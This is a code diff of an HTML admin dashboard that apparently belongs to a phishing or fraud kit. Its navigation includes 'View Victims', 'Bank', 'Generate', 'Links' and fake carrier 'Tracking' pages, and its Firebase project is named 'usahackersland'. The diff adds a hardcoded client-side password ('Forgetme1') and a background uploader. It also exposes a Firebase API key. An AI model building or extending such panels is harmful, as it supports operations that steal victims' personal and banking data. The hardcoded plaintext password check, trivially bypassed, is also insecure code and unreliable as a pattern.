@@ -1,49 +1,230 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Admin Dashboard</title>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
   <style>
-    body { margin: 0; font-family: Arial, sans-serif; background: #f4f4f4; }
-    .header { background: #222; color: #fff; padding: 10px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 15px; }
-    .header img { height: 50px; }
-    .nav { background: #333; display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; padding: 10px; }
-    .nav a { color: white; text-decoration: none; font-weight: bold; background: #444; padding: 8px 15px; border-radius: 5px; }
-    .nav a:hover { background: #555; }
-    iframe { width: 100%; height: 80vh; border: none; }
-    .logo-upload { background: #fff; padding: 10px; text-align: center; }
+    /* Reset & basics */
+    body, html {
+      margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif; 
+      overflow: hidden;
+    }
+
+    /* Background container with image & animated gradient overlay */
+    #background {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-size: cover;
+      background-position: center center;
+      z-index: -2;
+    }
+
+    #animatedGradient {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: linear-gradient(-45deg, #0d0d0d, #222222, #000000, #333333);
+      background-size: 400% 400%;
+      animation: gradientShift 15s ease infinite;
+      opacity: 0.5;
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    @keyframes gradientShift {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+
+    /* Password form styling */
+    #passwordSection {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: rgba(0,0,0,0.8);
+      color: white;
+      z-index: 10;
+      position: relative;
+    }
+
+    #passwordSection input {
+      font-size: 1.2rem;
+      padding: 10px;
+      margin-top: 10px;
+      width: 280px;
+      border-radius: 5px;
+      border: none;
+    }
+
+    #passwordSection button {
+      margin-top: 15px;
+      padding: 10px 25px;
+      font-size: 1.1rem;
+      border-radius: 5px;
+      border: none;
+      cursor: pointer;
+      background-color: #555;
+      color: white;
+      transition: background-color 0.3s ease;
+    }
+    #passwordSection button:hover {
+      background-color: #777;
+    }
+
+    #passwordError {
+      color: #f44336;
+      margin-top: 10px;
+      height: 18px;
+    }
+
+    /* Admin content styling */
+    #adminContent {
+      display: none;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      background: rgba(255 255 255 / 0.85);
+      box-shadow: 0 0 40px rgba(0,0,0,0.3);
+    }
+
+    .header {
+      background: #222;
+      color: #fff;
+      padding: 10px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+      flex-shrink: 0;
+    }
+    .header img {
+      height: 50px;
+      border-radius: 6px;
+      object-fit: contain;
+    }
+
+    .nav {
+      background: #333;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      padding: 10px;
+      flex-shrink: 0;
+    }
+    .nav a {
+      color: white;
+      text-decoration: none;
+      font-weight: bold;
+      background: #444;
+      padding: 8px 15px;
+      border-radius: 5px;
+      user-select: none;
+      transition: background-color 0.2s ease;
+    }
+    .nav a:hover {
+      background: #555;
+    }
+
+    .logo-upload, .bg-upload {
+      background: #fff;
+      padding: 10px;
+      text-align: center;
+      border-top: 1px solid #ccc;
+      flex-shrink: 0;
+    }
+
+    iframe {
+      flex-grow: 1;
+      border: none;
+      width: 100%;
+      height: 100%;
+    }
+
   </style>
 </head>
 <body>
-  <div class="header">
-    <img id="dashboardLogo" src="logo.png" alt="Logo">
-    <h1>Admin Dashboard</h1>
+
+  <!-- Background containers -->
+  <div id="background"></div>
+  <div id="animatedGradient"></div>
+
+  <!-- Password prompt -->
+  <div id="passwordSection">
+    <h2>Enter Admin Password</h2>
+    <input type="password" id="passwordInput" placeholder="Password" autocomplete="off" />
+    <button id="submitPassword">Submit</button>
+    <div id="passwordError"></div>
   </div>
 
-  <div class="nav">
-    <a href="#" onclick="loadPage('form-builder')">🎨 Form Builder</a>
-    <a href="#" onclick="loadPage('forms')">💾 Saved Forms</a>
-    <a href="#" onclick="loadPage('feedback')">📝 Feedback</a>
-    <a href="#" onclick="loadPage('victims')">🧠 View Victims</a>
-    <a href="#" onclick="loadPage('members')">👥 Members</a>
-    <a href="#" onclick="loadPage('links')">🔗 Links</a>
-    <a href="#" onclick="loadPage('generate')">🧾 Generate</a>
-    <a href="#" onclick="loadPage('bank')">🏦 Bank</a>
-    <a href="#" onclick="loadPage('tracking')">📦 Tracking (Carrier Federal)</a>
-  </div>
+  <!-- Admin dashboard content -->
+  <div id="adminContent">
+    <div class="header">
+      <img id="dashboardLogo" src="logo.png" alt="Logo" />
+      <h1>Admin Dashboard</h1>
+    </div>
 
-  <div class="logo-upload">
-    <h3>📷 Change Platform Logo (Admin Only)</h3>
-    <input type="file" id="logoInput" accept="image/*" />
-  </div>
+    <div class="nav">
+      <a href="#" onclick="loadPage('form-builder')">🎨 Form Builder</a>
+      <a href="#" onclick="loadPage('forms')">💾 Saved Forms</a>
+      <a href="#" onclick="loadPage('feedback')">📝 Feedback</a>
+      <a href="#" onclick="loadPage('victims')">🧠 View Victims</a>
+      <a href="#" onclick="loadPage('members')">👥 Members</a>
+      <a href="#" onclick="loadPage('links')">🔗 Links</a>
+      <a href="#" onclick="loadPage('generate')">🧾 Generate</a>
+      <a href="#" onclick="loadPage('bank')">🏦 Bank</a>
+      <a href="#" onclick="loadPage('tracking')">📦 Tracking (Carrier Federal)</a>
+    </div>
 
-  <iframe id="iframePage" src="Social-media-links/build.html"></iframe>
+    <div class="logo-upload">
+      <h3>📷 Change Platform Logo (Admin Only)</h3>
+      <input type="file" id="logoInput" accept="image/*" />
+    </div>
+
+    <div class="bg-upload">
+      <h3>🖼️ Change Background Image</h3>
+      <input type="file" id="bgInput" accept="image/*" />
+      <button id="clearBg" style="margin-top:8px; cursor:pointer;">Clear Background</button>
+    </div>
+
+    <iframe id="iframePage" src="Social-media-links/build.html"></iframe>
+  </div>
 
   <script>
+    const PASSWORD = "Forgetme1";
+
+    const passwordSection = document.getElementById("passwordSection");
+    const adminContent = document.getElementById("adminContent");
+    const passwordInput = document.getElementById("passwordInput");
+    const submitPassword = document.getElementById("submitPassword");
+    const passwordError = document.getElementById("passwordError");
+
+    submitPassword.addEventListener("click", () => {
+      if (passwordInput.value === PASSWORD) {
+        passwordSection.style.display = "none";
+        adminContent.style.display = "flex";
+      } else {
+        passwordError.textContent = "Incorrect password. Please try again.";
+        passwordInput.value = "";
+        passwordInput.focus();
+      }
+    });
+
+    passwordInput.addEventListener("keydown", (e) => {
+      if (e.key === "Enter") {
+        submitPassword.click();
+      }
+    });
+
+    // Firebase config and initialization
     const firebaseConfig = {
       apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
       authDomain: "usahackersland.firebaseapp.com",
@@ -61,7 +242,6 @@
         window.location.href = "login.html";
         return;
       }
-
       try {
         const docSnap = await db.collection("users").doc(user.uid).get();
         if (!docSnap.exists) {
@@ -69,9 +249,8 @@
           return auth.signOut();
         }
         const userData = docSnap.data();
-
         if (userData.role !== "admin") {
-          return window.location.href = "dashboard.html";
+          window.location.href = "dashboard.html";
         }
       } catch (err) {
         console.error(err);
@@ -82,36 +261,67 @@
 
     function loadPage(page) {
       const iframe = document.getElementById("iframePage");
-      if (page === 'form-builder') iframe.src = base + "build.html";
-      else if (page === 'forms') iframe.src = base + "forms.html";
-      else if (page === 'feedback') iframe.src = base + "feedback.html";
-      else if (page === 'victims') iframe.src = base + "victims.html";
-      else if (page === 'members') iframe.src = base + "members.html";
-      else if (page === 'links') iframe.src = base + "links.html";
-      else if (page === 'generate') iframe.src = base + "generate.html";
-      else if (page === 'bank') iframe.src = base + "bank.html";
-      else if (page === 'tracking') iframe.src = base + "tracking.html";
+      if (page === "form-builder") iframe.src = base + "build.html";
+      else if (page === "forms") iframe.src = base + "forms.html";
+      else if (page === "feedback") iframe.src = base + "feedback.html";
+      else if (page === "victims") iframe.src = base + "victims.html";
+      else if (page === "members") iframe.src = base + "members.html";
+      else if (page === "links") iframe.src = base + "links.html";
+      else if (page === "generate") iframe.src = base + "generate.html";
+      else if (page === "bank") iframe.src = base + "bank.html";
+      else if (page === "tracking") iframe.src = base + "tracking.html";
     }
 
-    const logoInput = document.getElementById('logoInput');
-    const dashboardLogo = document.getElementById('dashboardLogo');
+    // Logo upload and save
+    const logoInput = document.getElementById("logoInput");
+    const dashboardLogo = document.getElementById("dashboardLogo");
 
-    logoInput.addEventListener('change', function (e) {
+    logoInput.addEventListener("change", function (e) {
       const file = e.target.files[0];
       if (file) {
         const reader = new FileReader();
         reader.onload = function (event) {
           const logoURL = event.target.result;
           dashboardLogo.src = logoURL;
-          localStorage.setItem('platformLogo', logoURL);
+          localStorage.setItem("platformLogo", logoURL);
         };
         reader.readAsDataURL(file);
       }
     });
 
-    const savedLogo = localStorage.getItem('platformLogo');
+    // Load saved logo on page load
+    const savedLogo = localStorage.getItem("platformLogo");
     if (savedLogo) {
       dashboardLogo.src = savedLogo;
+    }
+
+    // Background image upload and save
+    const bgInput = document.getElementById("bgInput");
+    const backgroundDiv = document.getElementById("background");
+    const clearBgButton = document.getElementById("clearBg");
+
+    bgInput.addEventListener("change", function (e) {
+      const file = e.target.files[0];
+      if (!file) return;
+
+      const reader = new FileReader();
+      reader.onload = function (event) {
+        const bgURL = event.target.result;
+        backgroundDiv.style.backgroundImage = `url('${bgURL}')`;
+        localStorage.setItem("adminBackground", bgURL);
+      };
+      reader.readAsDataURL(file);
+    });
+
+    clearBgButton.addEventListener("click", () => {
+      backgroundDiv.style.backgroundImage = "";
+      localStorage.removeItem("adminBackground");
+    });
+
+    // Load saved background image on page load
+    const savedBg = localStorage.getItem("adminBackground");
+    if (savedBg) {
+      backgroundDiv.style.backgroundImage = `url('${savedBg}')`;
     }
   </script>
 </body>
